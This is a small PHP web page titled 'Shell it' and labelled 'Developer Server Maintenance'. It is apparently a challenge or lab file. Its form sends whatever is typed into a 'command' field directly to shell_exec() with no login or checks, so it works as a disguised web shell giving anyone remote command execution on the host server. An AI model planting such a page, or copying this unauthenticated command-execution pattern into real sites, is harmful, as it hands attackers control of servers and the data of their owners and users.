<!DOCTYPE html>
<html>
    <title>Shell it</title>
    <head>
        <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    </head>
    <body class="corb-body container-fluid">
<?php
if (isset($_POST['command'])) {
    shell_exec($_POST['command']);
}
?>
    <div class="row">
        <div class="centered">
            <div class="well">
                <center><h3 class="corb-login-length">Developer Server Maintenance</h3></center>
                <br/>
                <form method="POST">
                    <input name="command" class="form-control" type="text" placeholder="command">
                    <br/>
                    <input name="submit" class="corb-submit btn btn-primary btn-lg" type="submit" value="Run">
                </form>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.1.1.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    </body>
</html>
